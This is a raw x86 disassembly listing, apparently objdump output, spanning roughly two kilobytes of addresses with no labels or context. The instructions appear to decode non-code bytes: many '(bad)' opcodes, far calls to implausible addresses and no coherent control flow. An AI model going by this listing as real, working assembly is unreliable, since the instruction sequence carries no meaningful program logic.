  413ea2:	ja     0x413ed4
  413ea4:	xor    ah,cl
  413ea6:	jb     0x413edb
  413ea8:	cwde   
  413ea9:	loope  0x413e57
  413eab:	cmp    eax,esi
  413ead:	imul   edx,DWORD PTR [ecx-0x6b],0x49
  413eb1:	sbb    edx,esi
  413eb3:	rol    edx,1
  413eb5:	inc    edx
  413eb6:	pop    ecx
  413eb7:	repnz xlat BYTE PTR ds:[ebx]
  413eb9:	test   DWORD PTR [ecx+0x10c00fb6],0x5a914274
  413ec3:	sti    
  413ec4:	xchg   esp,esi
  413ec6:	xchg   BYTE PTR [edi+0x7d],al
  413ec9:	inc    ecx
  413eca:	cmp    edi,DWORD PTR [esi]
  413ecc:	nop
  413ecd:	pop    edx
  413ece:	inc    esp
  413ecf:	xchg   ecx,eax
  413ed0:	cmp    bh,BYTE PTR [eax+0x6a]
  413ed3:	icebp  
  413ed4:	sbb    eax,DWORD PTR [esi+0x3a]
  413ed7:	mov    al,0xae
  413ed9:	mov    ds:0x390c114b,eax
  413ede:	sub    edi,DWORD PTR [ebx]
  413ee0:	xor    al,0x16
  413ee2:	and    DWORD PTR [ebx-0x58],0x80d9d2b1
  413ee9:	dec    ecx
  413eea:	cmp    DWORD PTR [ebp-0x514c316],0x15
  413ef1:	outs   dx,BYTE PTR ds:[esi]
  413ef2:	test   al,0x84
  413ef4:	fisttp WORD PTR [ebx]
  413ef6:	call   DWORD PTR ds:0xe50d6d65
  413efc:	test   eax,0xf6716d13
  413f01:	add    DWORD PTR [edi-0x11],edi
  413f04:	inc    edx
  413f05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f06:	lds    esp,FWORD PTR ds:0xb91c47e1
  413f0c:	adc    eax,0x6ac22259
  413f11:	jg     0x413f71
  413f13:	push   ss
  413f14:	push   esp
  413f15:	dec    esp
  413f16:	cdq    
  413f17:	test   DWORD PTR [eax],esp
  413f19:	lahf   
  413f1a:	mov    al,0x4b
  413f1c:	jecxz  0x413f8a
  413f1e:	mov    ebx,0x5c578ae6
  413f23:	inc    esi
  413f24:	inc    edx
  413f25:	inc    eax
  413f26:	push   edx
  413f27:	(bad)  
  413f28:	push   edi
  413f29:	and    esp,DWORD PTR [esi-0x28066df9]
  413f2f:	shl    DWORD PTR [ecx-0x69],0x65
  413f33:	shr    BYTE PTR [ebx+ebx*4+0x381ca47d],cl
  413f3a:	popf   
  413f3b:	fs call 0x925f:0xc349cc18
  413f43:	pop    eax
  413f44:	loopne 0x413ec6
  413f46:	cld    
  413f47:	xor    eax,0x71f1aa5a
  413f4c:	js     0x413f5a
  413f4e:	out    0xc0,al
  413f50:	shl    DWORD PTR [edi],cl
  413f52:	not    DWORD PTR [esi]
  413f54:	and    DWORD PTR [ebx],0xf943d231
  413f5a:	mov    edi,0xa0633df5
  413f5f:	sub    BYTE PTR [ebx-0x3f],ah
  413f62:	out    0xfc,al
  413f64:	mov    DWORD PTR [edi],0x8945aa8
  413f6a:	out    dx,al
  413f6b:	dec    esi
  413f6c:	stos   BYTE PTR es:[edi],al
  413f6d:	mov    dh,0x3f
  413f6f:	(bad)  
  413f70:	leave  
  413f71:	xchg   edi,eax
  413f72:	test   al,0xc4
  413f74:	dec    edi
  413f75:	add    BYTE PTR ds:0x5658d71f,ch
  413f7b:	jl     0x413fd4
  413f7d:	cmp    edi,0xfffffff5
  413f80:	sar    DWORD PTR [ebp+0xb],0x2b
  413f84:	es inc ecx
  413f86:	call   0xe06e:0x9fd00884
  413f8d:	cmp    edi,eax
  413f8f:	das    
  413f90:	imul   esi,DWORD PTR [esi-0x4663392],0xe1374ae
  413f9a:	int    0xda
  413f9c:	mov    BYTE PTR [eax+edx*8+0x6c],dh
  413fa0:	mov    ds:0x2f5ffb6b,al
  413fa5:	dec    ebp
  413fa6:	push   eax
  413fa7:	loopne 0x413ff3
  413fa9:	pop    ebp
  413fab:	sbb    eax,DWORD PTR [esi+0x1998bb11]
  413fb1:	fisub  DWORD PTR [ebx]
  413fb3:	addr16 (bad) 
  413fb5:	xchg   ecx,eax
  413fb6:	(bad)  
  413fb7:	out    0x24,al
  413fb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fba:	dec    edx
  413fbb:	jge    0x413f58
  413fbd:	mov    bh,0x40
  413fbf:	nop
  413fc0:	test   DWORD PTR [edi+ebx*4-0x25],esi
  413fc4:	fild   QWORD PTR [eax+ebx*8+0x78956913]
  413fcb:	push   es
  413fcc:	and    bh,bh
  413fce:	in     eax,dx
  413fcf:	add    eax,0x5e041fc9
  413fd4:	faddp  st(2),st
  413fd6:	add    esp,DWORD PTR [edi]
  413fd8:	ss cwde 
  413fda:	pop    es
  413fdb:	and    eax,0xe35604e3
  413fe0:	test   eax,0xa1d5a4ec
  413fe5:	inc    esp
  413fe6:	xlat   BYTE PTR ds:[ebx]
  413fe7:	adc    esi,edi
  413fe9:	mov    eax,ds:0xdb914ddd
  413fee:	xchg   esi,eax
  413fef:	std    
  413ff0:	retf   0x8193
  413ff3:	loope  0x413fd7
  413ff5:	and    ah,BYTE PTR [eax]
  413ff7:	ret    
  413ff8:	mov    al,0x83
  413ffa:	call   0xd91d:0x91366333
  414001:	dec    ebx
  414002:	fimul  WORD PTR [ecx+0x27eff6d5]
  414008:	mov    esp,0xd521aa2d
  41400d:	pop    es
  41400e:	add    cl,cl
  414010:	sub    cl,BYTE PTR [ebx-0x5]
  414013:	in     eax,0xd7
  414015:	jmp    0xdd497335
  41401a:	mov    edi,0x46bb27a2
  41401f:	pop    es
  414020:	aas    
  414021:	test   DWORD PTR [eax+0x72722dfa],0x323e3406
  41402b:	xlat   BYTE PTR ds:[ebx]
  41402c:	cdq    
  41402d:	jo     0x4140a0
  41402f:	leave  
  414030:	idiv   DWORD PTR [edx-0x339d4591]
  414036:	fs mov eax,0xbbe47674
  41403c:	dec    edx
  41403d:	lock pop edi
  41403f:	mov    esp,DWORD PTR [ecx]
  414041:	xor    edx,DWORD PTR [ebp-0x29]
  414044:	or     eax,0x9d63e6d
  414049:	push   0x2050070d
  41404e:	pop    esi
  41404f:	lods   eax,DWORD PTR ds:[esi]
  414050:	addr16 mov al,ds:0x95d6
  414054:	test   eax,esp
  414056:	mov    bh,0xc7
  414058:	push   0xffffffba
  41405a:	sbb    ch,bl
  41405c:	out    dx,eax
  41405d:	adc    eax,DWORD PTR [esi-0xd]
  414060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414061:	mov    esp,DWORD PTR [esi*8-0x164e30d7]
  414068:	sub    al,0xbe
  41406a:	dec    eax
  41406b:	shl    BYTE PTR [esi],cl
  41406d:	push   edi
  41406e:	scas   al,BYTE PTR es:[edi]
  41406f:	in     al,dx
  414070:	das    
  414071:	fst    QWORD PTR [edi]
  414073:	mov    ch,dl
  414075:	sti    
  414076:	cmp    eax,0x55a71371
  41407b:	pop    ecx
  41407c:	pop    ds
  41407d:	aad    0xeb
  41407f:	pop    esi
  414080:	cmp    BYTE PTR [ecx-0x1],dl
  414083:	std    
  414084:	cwde   
  414085:	sar    DWORD PTR [ebx+edi*2+0x79eecf3a],1
  41408c:	cmp    al,0xe5
  41408e:	inc    dx
  414090:	push   0xffffff93
  414092:	jmp    0x41409a
  414094:	inc    edi
  414095:	cdq    
  414096:	adc    DWORD PTR [ebx+ebx*2],0xffffffaf
  41409a:	hlt    
  41409b:	mov    BYTE PTR [ecx+0x24bc3c33],bl
  4140a1:	or     DWORD PTR [edi],ecx
  4140a3:	test   al,0x4c
  4140a5:	sbb    ah,BYTE PTR [edi+0x51]
  4140a8:	imul   esp,DWORD PTR [ebx],0x62db226f
  4140ae:	mov    ebp,0x4f7d74ea
  4140b3:	or     BYTE PTR [edi],cl
  4140b5:	jmp    0xaa2f0040
  4140ba:	and    eax,0x4044b4ef
  4140bf:	mov    dh,0xaf
  4140c1:	add    BYTE PTR [esi],dl
  4140c3:	jg     0x41409b
  4140c5:	outs   dx,DWORD PTR ds:[esi]
  4140c6:	test   al,0x36
  4140c8:	(bad)  
  4140c9:	inc    ebx
  4140ca:	sbb    BYTE PTR [esi-0x694e8aad],cl
  4140d0:	daa    
  4140d1:	sahf   
  4140d2:	out    dx,al
  4140d3:	dec    eax
  4140d4:	adc    bh,BYTE PTR [esi]
  4140d6:	xor    dl,ch
  4140d8:	imul   ecx,DWORD PTR [ecx+0x4907a152],0x13
  4140df:	aad    0xf3
  4140e1:	sub    eax,0x22f65907
  4140e6:	xor    cl,dl
  4140e8:	add    bh,BYTE PTR [ecx]
  4140ea:	xor    DWORD PTR [ebp+0x55312dc5],0x22
  4140f1:	push   edi
  4140f2:	xor    BYTE PTR [edi],dh
  4140f4:	addr16 push dx
  4140f7:	or     bl,BYTE PTR [esi]
  4140f9:	and    al,0x5d
  4140fb:	jecxz  0x414114
  4140fd:	adc    edi,DWORD PTR [edi+0x4e]
  414100:	lods   al,BYTE PTR ds:[esi]
  414101:	rol    BYTE PTR [ebp+0x3ecc52ac],0xaf
  414108:	inc    edx
  414109:	mov    dh,0xba
  41410c:	bound  esi,QWORD PTR [edi]
  41410e:	(bad)
  414113:	popf   
  414114:	xor    BYTE PTR [ebp+0x7b],cl
  414117:	mov    al,ds:0xc75fff31
  41411c:	outs   dx,BYTE PTR ds:[esi]
  41411d:	ror    BYTE PTR [edi],cl
  41411f:	adc    bh,BYTE PTR [esi]
  414121:	mov    ds:0xd34b0889,al
  414126:	inc    esi
  414127:	fs retf 0x30be
  41412b:	or     eax,0x46e308df
  414130:	pop    edi
  414131:	jo     0x4140fd
  414133:	fdivrp st(7),st
  414135:	dec    edx
  414136:	jmp    0x2f0c:0x17b9096a
  41413d:	(bad)  
  41413e:	jl     0x414117
  414140:	ret    0x610a
  414143:	and    ah,BYTE PTR [ebp+0x5e9d5f05]
  414149:	sub    eax,0x7ed9481b
  41414e:	lock fcom DWORD PTR [edx+eax*4]
  414152:	xchg   ebx,eax
  414153:	cdq    
  414154:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  414156:	xchg   ecx,eax
  414157:	xchg   BYTE PTR [eax-0x17],ch
  41415a:	in     al,dx
  41415b:	call   DWORD PTR [ebp+0x30b43ab2]
  414161:	push   0xef8f5d20
  414166:	add    ah,BYTE PTR [ebp-0x4e]
  414169:	push   esi
  41416a:	call   0xe4f8:0x47d92e73
  414171:	inc    edx
  414172:	inc    esi
  414173:	shl    DWORD PTR [eax-0x63],cl
  414176:	xchg   edi,eax
  414177:	inc    eax
  414178:	and    al,0xa6
  41417a:	mov    ecx,0xa55f7a27
  41417f:	inc    edx
  414180:	fwait
  414181:	aam    0xe6
  414183:	dec    ecx
  414184:	pop    ecx
  414185:	xchg   ebp,eax
  414186:	aas    
  414187:	int    0xaa
  414189:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41418b:	dec    esi
  41418c:	cmp    DWORD PTR [esi],edi
  41418e:	pop    edx
  41418f:	stos   DWORD PTR es:[edi],eax
  414190:	push   0xfffffffc
  414192:	mov    BYTE PTR [eax+0x32ddc9b2],bh
  414198:	clc    
  414199:	jbe    0x414213
  41419b:	jle    0x4141fa
  41419d:	xor    BYTE PTR [esi-0x4],al
  4141a0:	jp     0x414177
  4141a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141a3:	mov    eax,ds:0x97c5bd76
  4141a8:	stos   BYTE PTR es:[edi],al
  4141a9:	xor    al,0x9a
  4141ab:	mov    esi,0x3973011a
  4141b0:	test   ebx,0x89bc9586
  4141b6:	gs aad 0x21
  4141b9:	mov    ds:0x11a50692,al
  4141be:	sti    
  4141bf:	outs   dx,DWORD PTR ds:[esi]
  4141c0:	cmp    eax,0xadda7c0a
  4141c5:	push   ecx
  4141c6:	pop    esi
  4141c7:	push   0xffffffcf
  4141c9:	mov    esp,0xe851202a
  4141ce:	jle    0x4141cd
  4141d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141d1:	das    
  4141d2:	stos   DWORD PTR es:[edi],eax
  4141d3:	outs   dx,BYTE PTR ds:[esi]
  4141d4:	xchg   ecx,eax
  4141d5:	pop    edi
  4141d6:	std    
  4141d7:	clc    
  4141d8:	in     al,dx
  4141d9:	dec    esp
  4141da:	lods   eax,DWORD PTR ds:[esi]
  4141db:	mov    edi,0x86a7dfc6
  4141e0:	push   es
  4141e1:	pop    ebx
  4141e2:	xor    BYTE PTR [edx-0x6c3eb055],bh
  4141e8:	mov    dh,0x35
  4141ea:	xor    al,0x95
  4141ec:	iret   
  4141ed:	xor    ah,BYTE PTR [edx+0xaa99edf]
  4141f3:	or     dl,ah
  4141f5:	ja     0x414193
  4141f7:	je     0x4141f8
  4141f9:	bound  edx,QWORD PTR [edi-0x70]
  4141fc:	hlt    
  4141fd:	xchg   ecx,eax
  4141fe:	test   BYTE PTR [edi],0x76
  414201:	sbb    eax,DWORD PTR [eiz*8+0x7777f75d]
  414208:	(bad)  
  414209:	jo     0x4141d2
  41420b:	sahf   
  41420c:	dec    ebp
  41420d:	sub    BYTE PTR [ebx+0x469edae8],ch
  414213:	aas    
  414214:	(bad)  
  414215:	adc    al,0x8e
  414217:	into   
  414218:	sti    
  414219:	ja     0x414280
  41421b:	lahf   
  41421c:	xchg   DWORD PTR [esi+0xc13bb43],ebx
  414222:	mov    cl,0xab
  414224:	mov    edx,0xa66f0cb2
  414229:	rcr    dl,cl
  41422b:	mov    al,0xe6
  41422d:	fwait
  41422e:	int    0x1c
  414230:	mov    ebx,0xebb3c887
  414235:	aaa    
  414236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414237:	sbb    ch,BYTE PTR [eax]
  414239:	mov    ebx,0x555712a2
  41423e:	(bad)  
  41423f:	xchg   ecx,eax
  414240:	or     BYTE PTR [edi-0x41cf5028],0x6e
  414247:	clc    
  414248:	into   
  414249:	jmp    FWORD PTR [edx-0x72c1798]
  41424f:	pusha  
  414250:	add    eax,0x96108282
  414255:	xchg   edx,eax
  414256:	arpl   WORD PTR [ebp-0x329ed6bc],si
  41425c:	lahf   
  41425d:	clc    
  41425e:	cwde   
  41425f:	add    ebp,ebp
  414261:	xchg   BYTE PTR [ebx+0x17ecb900],cl
  414267:	pop    esp
  414268:	pushf  
  414269:	lods   eax,DWORD PTR ds:[esi]
  41426a:	sar    esp,1
  41426c:	sar    BYTE PTR [esi],1
  41426e:	cmp    eax,0x735b4bb9
  414273:	fld    TBYTE PTR [esi]
  414275:	dec    esi
  414276:	xchg   edx,eax
  414277:	push   ss
  414278:	pop    ecx
  414279:	loop   0x41422c
  41427b:	or     ebp,DWORD PTR [ecx+0x132083fb]
  414281:	(bad)  
  414283:	std    
  414284:	add    al,0x68
  414286:	call   0x4d94:0xc078578f
  41428d:	pop    edx
  41428e:	cli    
  41428f:	fist   DWORD PTR [ecx-0x58]
  414292:	aad    0x77
  414294:	pop    edx
  414295:	mov    al,ds:0xbefcd346
  41429a:	adc    ecx,DWORD PTR [esi]
  41429c:	jge    0x41429f
  41429e:	test   al,0x11
  4142a0:	push   ds
  4142a1:	stos   DWORD PTR es:[edi],eax
  4142a2:	or     ecx,edi
  4142a4:	push   cs
  4142a5:	jmp    0x4142e2
  4142a7:	inc    ebx
  4142a8:	add    edx,DWORD PTR [ebp+0xbb60d52]
  4142ae:	sub    al,0xba
  4142b0:	jmp    0xb604:0x93bf746c
  4142b7:	adc    DWORD PTR [eax-0x6b8c977d],edi
  4142bd:	inc    esi
  4142be:	mov    eax,0x6705bee8
  4142c3:	idiv   ebp
  4142c5:	mov    ah,0xaf
  4142c7:	inc    esi
  4142c8:	mov    al,0xbd
  4142ca:	jg     0x414324
  4142cc:	or     bl,cl
  4142ce:	call   0xd88d:0x40b61ed8
  4142d5:	clc    
  4142d6:	arpl   WORD PTR [esi],si
  4142d8:	aad    0x32
  4142da:	mov    ds:0x76133321,eax
  4142df:	sub    eax,0x73734d54
  4142e4:	scas   eax,DWORD PTR es:[edi]
  4142e5:	scas   eax,DWORD PTR es:[edi]
  4142e6:	sub    bh,BYTE PTR [edx+0x13]
  4142e9:	jnp    0x4142e1
  4142eb:	mov    bh,0x30
  4142ed:	call   0xf4492ad6
  4142f2:	retf   0x12ba
  4142f5:	mov    dl,0x4a
  4142f7:	dec    ebp
  4142f8:	daa    
  4142f9:	push   ecx
  4142fa:	jle    0x41430f
  4142fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142fd:	sub    esi,ecx
  4142ff:	pop    ecx
  414300:	adc    DWORD PTR [eax+0x17],0x450e0bcb
  414307:	cwde   
  414308:	jg     0x414364
  41430a:	push   cs
  41430b:	ss dec edi
  41430d:	rcl    DWORD PTR [ebx+0x41],cl
  414310:	inc    edi
  414311:	mov    cl,BYTE PTR [ebx-0x45]
  414314:	outs   dx,DWORD PTR ds:[esi]
  414315:	out    0x2b,al
  414317:	cmp    bl,BYTE PTR [eax-0x1ad3078]
  41431d:	or     al,0xff
  41431f:	lds    ebp,FWORD PTR [esi-0x35]
  414322:	jmp    0x4142a8
  414324:	loopne 0x414377
  414326:	mov    esi,0x75d161bf
  41432b:	shr    al,0x69
  41432e:	fs mov ebx,0x2764cd6
  414334:	out    0xde,eax
  414336:	das    
  414337:	inc    ebp
  414338:	repz jo 0x41434d
  41433b:	add    DWORD PTR [ebx+0x12d5c369],ebx
  414341:	popf   
  414342:	inc    ebp
  414343:	and    eax,0x6a369a74
  414348:	xchg   WORD PTR [ecx],sp
  41434b:	push   cs
  41434c:	xchg   ecx,eax
  41434d:	pop    edi
  41434e:	je     0x414354
  414350:	or     al,0x84
  414352:	fcomp  DWORD PTR [eax+ecx*4-0x1842289f]
  414359:	jmp    0xb2c7:0x72b53ca0
  414360:	sbb    dh,al
  414362:	add    eax,0xa4b07408
  414367:	jecxz  0x4143d9
  414369:	jmp    0x7688:0x87a636b6
  414370:	xchg   BYTE PTR [ebx+0x317563be],ch
  414376:	jo     0x4143ad
  414378:	loope  0x414388
  41437a:	dec    esp
  41437b:	add    eax,0xd8a3a5ab
  414380:	ss add ch,cl
  414383:	cwde   
  414384:	mov    esp,0xf0f56d0
  414389:	aam    0x41
  41438b:	or     DWORD PTR [esi+ebx*4],eax
  41438e:	xor    eax,0xde981d0b
  414393:	mov    bh,BYTE PTR [ebx]
  414395:	add    BYTE PTR [edx+ebp*1+0x23],al
  414399:	stos   BYTE PTR es:[edi],al
  41439a:	nop
  41439b:	sbb    esi,DWORD PTR [ecx-0x145809b9]
  4143a1:	xor    DWORD PTR [esi+0x16],ebp
  4143a4:	sahf   
  4143a5:	dec    edx
  4143a6:	icebp  
  4143a7:	pop    esp
  4143a8:	add    esp,edi
  4143aa:	inc    esp
  4143ab:	inc    edi
  4143ac:	dec    edi
  4143ae:	or     ch,BYTE PTR [edx-0x1a]
  4143b1:	xlat   BYTE PTR ds:[ebx]
  4143b2:	imul   esi,DWORD PTR [edx-0x66],0x31
  4143b6:	mov    ah,0xeb
  4143b8:	dec    esp
  4143b9:	pop    es
  4143ba:	cmc    
  4143bb:	mov    bh,0x3f
  4143bd:	stc    
  4143be:	sub    al,0xe
  4143c0:	cmp    al,0x47
  4143c2:	push   ds
  4143c3:	je     0x4143e7
  4143c5:	loopne 0x414417
  4143c7:	outs   dx,BYTE PTR ds:[esi]
  4143c8:	mov    cl,0x1
  4143ca:	cwde   
  4143cb:	sub    edi,DWORD PTR [ecx-0x2d]
  4143ce:	fldcw  WORD PTR [ecx-0x4b]
  4143d1:	add    al,0xae
  4143d3:	enter  0xfd09,0x34
  4143d7:	jmp    0x41441e
  4143d9:	xor    DWORD PTR [esi],0xb30d8059
  4143df:	or     BYTE PTR [eax-0x2a],dl
  4143e2:	inc    edx
  4143e3:	or     al,0xdc
  4143e5:	sub    al,0xe6
  4143e7:	je     0x414401
  4143e9:	fmul   QWORD PTR ds:0x7905c1da
  4143ef:	arpl   WORD PTR [esi-0x221b1868],bp
  4143f5:	push   esp
  4143f6:	push   cs
  4143f7:	scas   eax,DWORD PTR es:[edi]
  4143f8:	adc    ebx,DWORD PTR [ebp+0x3dcd5273]
  4143fe:	mov    ds:0x95b3805e,eax
  414403:	and    al,0x72
  414405:	js     0x4143b3
  414407:	inc    ecx
  414408:	xchg   edx,eax
  414409:	and    DWORD PTR [eax+esi*4-0x68],ecx
  41440d:	mov    esi,DWORD PTR fs:[edi-0x41]
  414411:	sub    BYTE PTR [ecx+eiz*4],ah
  414414:	fstp   QWORD PTR cs:[ebp-0x4]
  414418:	mov    ch,0xe5
  41441a:	rcr    BYTE PTR [ebx+0x57],0x90
  41441e:	mov    DWORD PTR [esi+eax*8-0x1d],esp
  414422:	les    eax,FWORD PTR [ecx-0x28]
  414425:	and    eax,0x7c05c5a6
  41442a:	jnp    0x414443
  41442c:	hlt    
  41442d:	(bad)  
  41442f:	xchg   ecx,eax
  414430:	pop    edx
  414431:	adc    ebx,DWORD PTR [edi-0x67]
  414434:	pop    ds
  414435:	fcmovu st,st(0)
  414437:	xchg   esi,eax
  414438:	push   eax
  414439:	test   eax,0x62ac41b4
  41443e:	inc    eax
  41443f:	call   0xea664292
  414444:	adc    al,0x1d
  414446:	inc    edi
  414447:	loopne 0x414435
  414449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41444a:	mov    ch,bl
  41444c:	dec    edi
  41444d:	daa    
  41444e:	jo     0x4144ab
  414450:	cmp    al,0xda
  414452:	jo     0x41447a
  414454:	jno    0x41442a
  414456:	pop    edi
  414457:	call   0x793b:0xa5af4e3
  41445e:	call   0x337:0x6ccb49ba
  414465:	push   cs
  414466:	inc    esp
  414467:	lea    ebp,[ecx+0x63b7b1c7]
  41446d:	hlt    
  41446e:	call   0x2a5ebda6
  414473:	push   esp
  414474:	pop    ds
  414475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414476:	in     eax,dx
  414477:	js     0x4144bb
  414479:	aaa    
  41447a:	lods   eax,DWORD PTR ds:[esi]
  41447b:	jo     0x4144fc
  41447d:	es call 0xd7ad:0x7aeb1749
  414485:	mov    eax,0x502f1341
  41448a:	stos   DWORD PTR es:[edi],eax
  41448b:	cmc    
  41448c:	mov    DWORD PTR [edi+ebp*4],edx
  41448f:	repz call 0x8cf02f20
  414495:	and    DWORD PTR [esi+edi*1-0x4b245926],eax
  41449c:	aas    
  41449d:	cmp    eax,0x43d32a07
  4144a2:	push   ds
  4144a3:	outs   dx,DWORD PTR ds:[esi]
  4144a4:	sbb    dl,ch
  4144a6:	jge    0x414463
  4144a8:	in     eax,dx
  4144a9:	pop    esp
  4144aa:	sahf   
  4144ab:	xor    BYTE PTR [edi],al
  4144ad:	sahf   
  4144ae:	jne    0x4144b2
  4144b0:	add    al,0x94
  4144b2:	stc    
  4144b3:	aam    0x8a
  4144b5:	xor    ebx,ebp
  4144b7:	(bad)  
  4144b8:	mov    edi,0x4b280025
  4144bd:	repnz jmp 0x660:0x3f61f6fd
  4144c5:	mov    ds:0xe00f3e09,eax
  4144ca:	dec    edx
  4144cb:	push   ecx
  4144cc:	sbb    esi,ecx
  4144ce:	neg    DWORD PTR ds:[edx+0x10]
  4144d2:	mov    esp,0xae047725
  4144d7:	inc    esp
  4144d8:	push   edx
  4144d9:	add    BYTE PTR [ecx+0x66],0x2e
  4144dd:	xlat   BYTE PTR ds:[ebx]
  4144de:	mov    ebp,0xbf68ec30
  4144e3:	xchg   edi,eax
  4144e4:	lahf   
  4144e5:	and    ebx,esp
  4144e7:	xchg   edx,eax
  4144e8:	mov    cl,0x95
  4144ea:	pop    es
  4144eb:	fimul  DWORD PTR [ecx+0x45]
  4144ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144ef:	add    al,0x5d
  4144f1:	and    al,0x94
  4144f3:	xchg   ecx,eax
  4144f4:	mov    ds:0xff7a6ca1,eax
  4144f9:	ja     0x4144a4
  4144fb:	fwait
  4144fc:	mov    ah,0x9
  4144fe:	xor    edi,esi
  414500:	(bad)  
  414501:	xchg   ecx,eax
  414502:	jae    0x4144d6
  414504:	cmp    ah,BYTE PTR [esi-0x11fb8b7]
  41450a:	dec    ecx
  41450b:	rol    DWORD PTR [edi+0x36],0x8a
  41450f:	add    al,0x4e
  414511:	xor    eax,0xe52cd2f6
  414516:	aaa    
  414517:	xor    al,0x9d
  414519:	jge    0x414514
  41451b:	cmp    DWORD PTR [ecx+0x6402e3cd],edx
  414521:	aad    0x97
  414523:	out    0x0,al
  414525:	icebp  
  414526:	jecxz  0x414557
  414528:	hlt    
  414529:	xor    BYTE PTR [eax+0x16],al
  41452c:	ret    0x79d3
  41452f:	rol    DWORD PTR [ecx-0x2276cbf4],1
  414535:	fimul  WORD PTR [ecx-0x7df08fe3]
  41453b:	lods   eax,DWORD PTR ds:[esi]
  41453c:	pop    ebp
  41453d:	rcr    DWORD PTR [eax-0x24a7fe39],0x38
  414544:	retf   
  414545:	clc    
  414546:	mov    ecx,0x5b3eb55
  41454b:	test   al,0x1f
  41454d:	imul   DWORD PTR [ecx+0x6b]
  414550:	cmp    ch,BYTE PTR [esi]
  414552:	push   ss
  414553:	push   ebp
  414554:	pop    edx
  414555:	adc    BYTE PTR [ebx+0x43],bh
  414558:	mov    DWORD PTR [edx-0x1d67882d],esi
  41455e:	std    
  41455f:	mov    ebx,DWORD PTR [ebx-0x760572f4]
  414565:	mov    ah,0x8c
  414567:	fs mov edi,0x5db23fc0
  41456d:	add    BYTE PTR [eax],dl
  41456f:	dec    esi
  414570:	jb     0x414546
  414572:	(bad)  
  414573:	(bad)  
  414574:	(bad)  ds:0x597402ca
  41457a:	sub    al,0xc5
  41457c:	add    eax,DWORD PTR [ebx+ecx*4+0x40094539]
  414583:	(bad)  
  414584:	mov    al,0xf4
  414586:	inc    edx
  414587:	jb     0x4145b4
  414589:	ja     0x414606
  41458b:	cdq    
  41458c:	ficom  DWORD PTR [ebp+0x2d]
  41458f:	dec    edx
  414590:	inc    edi
  414591:	fcmovnu st,st(7)
  414593:	inc    edi
  414594:	cmp    al,0xe8
  414596:	jmp    0x414603
  414598:	cld    
  414599:	(bad)  
  41459a:	fcmovbe st,st(7)
  41459c:	mov    eax,0x410dafa6
  4145a1:	xlat   BYTE PTR ds:[ebx]
  4145a2:	ins    BYTE PTR es:[edi],dx
  4145a3:	adc    al,0x83
  4145a5:	push   0x22
  4145a7:	loop   0x41455c
  4145a9:	adc    al,0xce
  4145ab:	outs   dx,DWORD PTR ds:[esi]
  4145ac:	ret    0x271d
  4145af:	retf   0xc417
  4145b2:	outs   dx,BYTE PTR ds:[esi]
  4145b3:	clc    
  4145b4:	lods   eax,DWORD PTR ds:[esi]
  4145b5:	or     cl,BYTE PTR [edi+edx*4+0x20e048bd]
  4145bc:	push   edx
  4145bd:	xor    DWORD PTR [edi],ebp
  4145bf:	jno    0x414553
  4145c1:	stos   BYTE PTR es:[edi],al
  4145c2:	cmp    eax,0xfc9fd5af
  4145c7:	in     al,dx
  4145c8:	cmp    DWORD PTR [edi+0x7fd75bd9],eax
  4145ce:	sub    DWORD PTR [eax],edi
  4145d0:	test   DWORD PTR [ebx+0x23],0x79d5159
  4145d7:	(bad)  
  4145d8:	bound  esi,QWORD PTR ds:[esi+0x41]
  4145dc:	xchg   esi,eax
  4145dd:	mov    WORD PTR [esi+0x2612719f],?
  4145e3:	icebp  
  4145e4:	es jecxz 0x414631
  4145e7:	jle    0x414648
  4145e9:	xor    DWORD PTR [eax],ecx
  4145eb:	adc    eax,0xf3a09fce
  4145f0:	jg     0x414637
  4145f2:	sahf   
  4145f3:	loopne 0x4145e9
  4145f5:	sbb    eax,0xda30688d
  4145fa:	or     al,0xaf
  4145fc:	jmp    0x27e12e5f
  414601:	ret    
  414602:	push   es
  414603:	cmp    DWORD PTR [eax+edi*4],ebp
  414606:	jb     0x414649
  414608:	jno    0x4145f4
  41460a:	loope  0x4145fd
  41460c:	ret    
  41460d:	mov    edx,esi
  41460f:	iret   
  414610:	cdq    
  414611:	push   ds
  414612:	es jg  0x4145a4
  414615:	fs inc ebx
  414617:	repnz shr BYTE PTR [ecx-0x35],1
  41461b:	xor    BYTE PTR [eax+0x7478b671],0xd
  414622:	imul   edx,DWORD PTR [eax+0x9989aec],0x8b47873f
  41462c:	ja     0x414658
  41462e:	lds    ebp,FWORD PTR ds:0xe02b7e53
  414634:	rol    BYTE PTR [eax+ebp*1],1
  414637:	mov    esi,eax
  414639:	xor    BYTE PTR [ebx-0x64c5667d],bl
  41463f:	push   cs
  414640:	or     ebp,DWORD PTR [edx+0x8816413]
  414646:	jo     0x41f0d248
  41464c:	and    eax,0xd2ff6159
  414651:	into   
  414652:	inc    ebp
  414653:	in     al,0x7
  414655:	loope  0x4146aa
  414657:	arpl   WORD PTR [edi+0x79f5c93e],cx
  41465d:	cld    
  41465e:	cmp    bl,BYTE PTR [eax+0x60]
  414661:	call   0xfb8ef5f1
  414666:	push   ebp
  414667:	cmc    
  414668:	retf   
  414669:	sbb    BYTE PTR [ebp-0x2b],0xc9
  41466d:	fs mov cl,0xcc
  414670:	xor    edi,esp
  414672:	cmc    
  414673:	mov    esp,0xcb69a6d0
  414678:	or     al,al
  41467a:	test   eax,0x4a63d517
  41467f:	loope  0x414601
  414681:	mov    BYTE PTR [ecx],cl
  414683:	bound  edi,QWORD PTR [ecx+0x69292c99]
  414689:	inc    ebp
  41468a:	push   ebx
  41468b:	and    cl,BYTE PTR [esi]
  41468d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41468e:	push   ebx
  41468f:	mov    edi,0xf3f9b461
  414694:	cmove  ecx,eax
  414697:	aad    0xb2
  414699:	daa    
  41469a:	stc    
  41469b:	aad    0xb
  41469d:	or     al,0x23
